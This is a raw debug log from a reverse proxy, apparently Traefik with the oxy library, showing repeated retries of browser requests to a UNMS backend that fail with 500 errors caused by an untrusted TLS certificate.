time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward/http: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="upstream responsewriter of type *pipelining.writerwithoutclosenotify does not implement http.closenotifier
returning dummy channel."
time="2018-11-19t12:16:23z" level=debug msg="\'500 internal server error\' caused by: x509: certificate signed by unknown authority"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward/http: round trip: code: 500, length: 21, duration: 7.914971ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unms.mydomain.com"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward/http: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/roundrobin/rr: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="new attempt 3 for request: /"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/roundrobin/rr: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/roundrobin/rr: forwarding this request to url" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}" forwardurl=" "
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward/http: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="upstream responsewriter of type *pipelining.writerwithoutclosenotify does not implement http.closenotifier
returning dummy channel."
time="2018-11-19t12:16:23z" level=debug msg="\'500 internal server error\' caused by: x509: certificate signed by unknown authority"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward/http: round trip: code: 500, length: 21, duration: 7.792031ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unms.mydomain.com"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward/http: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/roundrobin/rr: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/roundrobin/rr: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/favicon.ico\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/roundrobin/rr: forwarding this request to url" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/favicon.ico\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}" forwardurl=" "
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward/http: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="upstream responsewriter of type *pipelining.writerwithoutclosenotify does not implement http.closenotifier
returning dummy channel."
time="2018-11-19t12:16:23z" level=debug msg="\'500 internal server error\' caused by: x509: certificate signed by unknown authority"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward/http: round trip: code: 500, length: 21, duration: 17.068165ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unms.mydomain.com"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward/http: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/roundrobin/rr: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/favicon.ico\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="new attempt 2 for request: /favicon.ico"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/roundrobin/rr: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/favicon.ico\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}"
